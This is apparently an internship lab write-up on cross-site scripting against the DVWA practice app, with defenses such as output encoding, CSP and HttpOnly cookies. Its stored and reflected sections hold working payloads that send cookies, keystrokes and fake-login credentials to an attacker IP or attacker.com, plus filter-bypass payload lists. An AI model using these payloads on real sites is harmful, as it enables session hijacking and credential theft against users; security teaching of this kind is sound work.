# Day 13 — Cross-Site Scripting (XSS)
### ApexPlanet Internship | Task 3: Web Application Security
**Timeline:** Days 25–36 | **Author:** Professorshubhx

---

## What is XSS

Cross-Site Scripting (XSS) is a web vulnerability where an attacker injects malicious JavaScript into a web page that is then executed by other users' browsers. Unlike SQL Injection which attacks the database, XSS attacks the users of the application.

When a browser loads a page, it executes any JavaScript it finds — it has no way to tell if that JavaScript was put there by the legitimate developer or by an attacker. XSS exploits this trust.

XSS has been in the OWASP Top 10 for over a decade. It's used to steal session cookies, redirect users to phishing pages, capture keystrokes, perform actions on behalf of users, and deface websites.

---

## Three Types of XSS

```
Stored XSS      Malicious script is saved in the database
                Every user who visits the page gets attacked
                Most dangerous type

Reflected XSS   Malicious script is in the URL
                Only users who click the crafted link get attacked
                Common in search boxes, error messages, URL parameters

DOM-based XSS   JavaScript in the page reads from the URL/DOM
                and writes it to the page without sanitization
                Never touches the server — purely client-side
```

---

## 1. Stored XSS on DVWA

### Setup

```
Go to DVWA → XSS (Stored)
Security level: Low
```

The page has a guestbook — Name field and Message field. Whatever you submit gets saved to the database and displayed to every user who visits the page.

### Basic Test

In the Message field, type:

```html
<script>alert('XSS')</script>
```

Click Sign Guestbook.

A popup alert appears — and it will appear for every user who loads this page, because the script is now stored in the database.

This proves stored XSS. Now let's do something more realistic.

### Cookie Stealing — Real Attack Scenario

In a real attack, an attacker doesn't use alert boxes — they steal session cookies. Whoever has your session cookie can impersonate you on that website.

In the Message field, type:

```html
<script>document.location='http://192.168.56.100/steal?cookie='+document.cookie</script>
```

Replace `192.168.56.100` with your Kali IP.

Before submitting, set up a listener on Kali to catch the incoming request:

```bash
# Start a simple HTTP server on Kali
python3 -m http.server 80
```

Now when any user visits the DVWA guestbook page, their browser executes the script, sends their cookie to your Kali server, and you see it in the terminal:

```
192.168.56.104 - - [10/May/2026] "GET /steal?cookie=PHPSESSID=abc123xyz; security=low HTTP/1.1" 200
```

That `PHPSESSID` value is their session cookie. In Burp Suite or browser dev tools, replace your cookie with theirs — you're now logged in as them.

### Other Stored XSS Payloads

```html
<!-- Redirect user to another site -->
<script>window.location='http://attacker.com'</script>

<!-- Capture keystrokes -->
<script>
document.onkeypress = function(e) {
  new Image().src = 'http://192.168.56.100/keys?k=' + e.key;
}
</script>

<!-- Deface the page -->
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>

<!-- Create a fake login form overlay -->
<script>
document.body.innerHTML = '<form action="http://attacker.com/capture" method="POST">' +
'<input name="user" placeholder="Username">' +
'<input type="password" name="pass" placeholder="Password">' +
'<button>Login</button></form>';
</script>
```

### Bypassing the Name Field Character Limit

DVWA limits the Name field to 10 characters — too short for a script tag. Bypass using Burp Suite:

1. Turn on Burp Proxy intercept
2. Fill in the form normally and click Submit
3. In Burp, find the `txtName` parameter
4. Replace its value with your payload
5. Forward the request

The character limit is enforced by the browser (HTML `maxlength` attribute) — not by the server. Burp bypasses the browser entirely.

---

## 2. Reflected XSS on DVWA

### Setup

```
Go to DVWA → XSS (Reflected)
Security level: Low
```

The page has a "What's your name?" field. Whatever you type gets reflected back in the page: "Hello [your input]"

### Basic Test

In the name field type:

```html
<script>alert('Reflected XSS')</script>
```

Submit. The alert fires — but notice the URL changed:

```
http://192.168.56.104/dvwa/vulnerabilities/xss_r/?name=<script>alert('Reflected XSS')</script>
```

The payload is in the URL. This is how reflected XSS works — the malicious script travels in a link.

### Crafting a Malicious Link

An attacker would encode this URL and send it to a victim:

```
http://192.168.56.104/dvwa/vulnerabilities/xss_r/?name=<script>document.location='http://192.168.56.100/steal?c='+document.cookie</script>
```

URL-encoded version (harder to spot):

```
http://192.168.56.104/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F192.168.56.100%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E
```

When a logged-in user clicks this link, their cookie is sent to the attacker's server. The user sees a brief flash or the page loads — they may not even notice.

### Reflected XSS via URL Bar

Try these directly in the DVWA reflected XSS URL:

```
# Image onerror event (alternative to script tag)
http://host/dvwa/vulnerabilities/xss_r/?name=<img src=x onerror=alert('XSS')>

# SVG tag
http://host/dvwa/vulnerabilities/xss_r/?name=<svg onload=alert('XSS')>

# Body tag
http://host/dvwa/vulnerabilities/xss_r/?name=<body onload=alert('XSS')>
```

These are useful when `<script>` tags are filtered — browsers execute JavaScript from many HTML tags, not just `<script>`.

---

## 3. DOM-Based XSS

DOM XSS happens entirely in the browser. The server sends a legitimate page, but client-side JavaScript reads from the URL (like `location.hash` or `location.search`) and writes it directly to the page without sanitization.

### Example Vulnerable JavaScript

```javascript
// Developer wrote this to show a welcome message from URL parameter
var name = document.location.href.substring(document.location.href.indexOf("name=") + 5);
document.getElementById("welcome").innerHTML = name;
```

Attacker crafts this URL:

```
http://vulnerable-site.com/page.html#name=<img src=x onerror=alert('DOM XSS')>
```

The `#` (hash) part never goes to the server — it's purely client-side. Server-side scanners won't find this. The browser reads the hash, inserts it into `innerHTML`, and the script executes.

### Finding DOM XSS

Look for these dangerous JavaScript sinks — places where data is written to the DOM:

```javascript
document.write()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout() with string argument
setInterval() with string argument
```

And these sources — where attacker-controlled data comes from:

```javascript
document.location
location.href
location.hash
location.search
document.referrer
window.name
```

If data flows from a source to a sink without sanitization — DOM XSS exists.

---

## 4. XSS Filter Bypass Techniques

When basic `<script>alert()>` is blocked, try these:

```html
<!-- Case variation -->
<SCRIPT>alert('XSS')</SCRIPT>
<ScRiPt>alert('XSS')</sCrIpT>

<!-- No script tag — event handlers -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input autofocus onfocus=alert('XSS')>
<select autofocus onfocus=alert('XSS')>

<!-- JavaScript protocol in href -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- Encoded payloads -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- Breaking up the word "script" if it's filtered -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>

<!-- Using backticks instead of quotes -->
<img src=x onerror=`alert('XSS')`>

<!-- Data URI -->
<object data="data:text/html,<script>alert('XSS')</script>">
```

---

## 5. Mitigation — How to Prevent XSS

### Output Encoding (Most Important)

Never insert user-supplied data directly into HTML. Always encode it first so the browser treats it as text, not as HTML or JavaScript.

```php
// VULNERABLE
echo "Hello " . $_GET['name'];

// SECURE — HTML encode the output
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

`htmlspecialchars()` converts:
```
< → &lt;
> → &gt;
" → &quot;
' → &#039;
& → &amp;
```

So `<script>alert('XSS')</script>` becomes `&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;` — displayed as text, not executed.

### Content Security Policy (CSP)

CSP is an HTTP response header that tells the browser which sources of JavaScript are allowed to execute. It's the most powerful XSS defense after output encoding.

Add this to Apache config or PHP header:

```apache
# In Apache httpd.conf or .htaccess
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
```

```php
// In PHP
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';");
```

What this means:
```
default-src 'self'     Load resources only from same origin
script-src 'self'      Only execute JavaScript from same origin
object-src 'none'      No Flash or plugins at all
```

With this CSP, even if an attacker injects `<script>alert('XSS')</script>`, the browser blocks it because the script doesn't come from the allowed origin.

### HttpOnly Cookie Flag

Prevents JavaScript from accessing cookies — so even if XSS runs, it can't steal session cookies:

```php
// Set cookie with HttpOnly flag
setcookie("PHPSESSID", session_id(), [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

```apache
# In Apache config
Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure;SameSite=Strict
```

With HttpOnly, `document.cookie` returns empty — the cookie stealing payload fails.

### Input Validation

Validate that input matches expected format before accepting it:

```php
// If you expect only alphanumeric input
if (!preg_match('/^[a-zA-Z0-9]+$/', $_GET['name'])) {
    die("Invalid input");
}
```

### Complete Defense Checklist

```
Output encoding         Encode all user data before inserting into HTML
Content Security Policy Block inline scripts and external script sources
HttpOnly cookies        JavaScript cannot read session cookies
Input validation        Reject input that doesn't match expected format
X-XSS-Protection header Enable browser's built-in XSS filter (legacy)
Use modern frameworks   React, Angular, Vue auto-escape by default
```

---

## 6. Testing XSS with Burp Suite

### Reflected XSS via Burp Repeater

1. Open Burp Suite → turn on Proxy intercept
2. Submit the DVWA XSS Reflected form with any value
3. Send the intercepted request to Repeater (Ctrl+R)
4. In Repeater, change the `name` parameter to different payloads
5. Click Send after each — check the response for unescaped script tags
6. If your payload appears in the response unescaped — it's vulnerable

### Scanning with Burp Scanner (Pro) or Active Scan++

Community Edition doesn't have automated scanner — use Repeater manually:

```
Payload list to try in Repeater:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
"><script>alert(1)</script>
'><script>alert(1)</script>
```

---

## Practice Tasks

1. Go to DVWA XSS (Stored) on Low — inject `<script>alert('XSS')</script>` in message field — confirm alert fires
2. Set up `python3 -m http.server 80` on Kali — inject cookie-stealing payload — confirm cookie appears in terminal
3. Go to DVWA XSS (Reflected) — inject `<img src=x onerror=alert(1)>` — confirm it fires
4. Craft a malicious URL with the reflected XSS payload — open it in a new browser tab
5. Try `<SCRIPT>alert(1)</SCRIPT>` (uppercase) on Medium security — does it work?
6. Try `<img src=x onerror=alert(1)>` on Medium security — does this bypass the filter?
7. In Burp Suite Repeater, test 5 different XSS payloads against the reflected XSS endpoint — document which ones work
8. Add the HttpOnly flag to a PHP session cookie — confirm `document.cookie` returns empty in browser console
9. Add a basic CSP header in Apache (`Header set Content-Security-Policy "script-src 'self'"`) — confirm the alert is blocked
10. Read the DVWA XSS source code — compare Low (no protection) vs High (htmlspecialchars) implementation

---

## Quick Reference

```
STORED XSS PAYLOADS             REFLECTED XSS PAYLOADS
<script>alert(1)</script>       Same payloads — but in URL parameter
<script>document.location=      Craft malicious link and send to victim
  'http://kali/steal?c='
  +document.cookie</script>

FILTER BYPASS                   PREVENTION
<img src=x onerror=alert(1)>    htmlspecialchars() — output encoding
<svg onload=alert(1)>           Content-Security-Policy header
<SCRIPT>alert(1)</SCRIPT>       HttpOnly cookie flag
javascript:alert(1)             Input validation
<a href="javascript:alert(1)">  Modern frameworks (React/Angular)

XSS TYPES
Stored   → Saved in DB → affects all users
Reflected → In URL → only users who click link
DOM       → Client-side JS → server never sees payload
```

---

## Resources

- OWASP XSS Guide: https://owasp.org/www-community/attacks/xss/
- PortSwigger XSS Labs: https://portswigger.net/web-security/cross-site-scripting
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
- XSS Payloads List: https://github.com/payloadbox/xss-payload-list
- Defronix Academy | Mentor: Nitesh Singh Sir

---

## Connect

- **LinkedIn:** [Shubham Chaurasiya](https://www.linkedin.com/in/shubham-chaurasiya-60932a359/)
- **TryHackMe:** [professorshubhx](https://tryhackme.com/p/professorshubhx)

---

*Day 13 Complete | Next: Day 14 — CSRF (Cross-Site Request Forgery) — Password change attack, token-based protection*
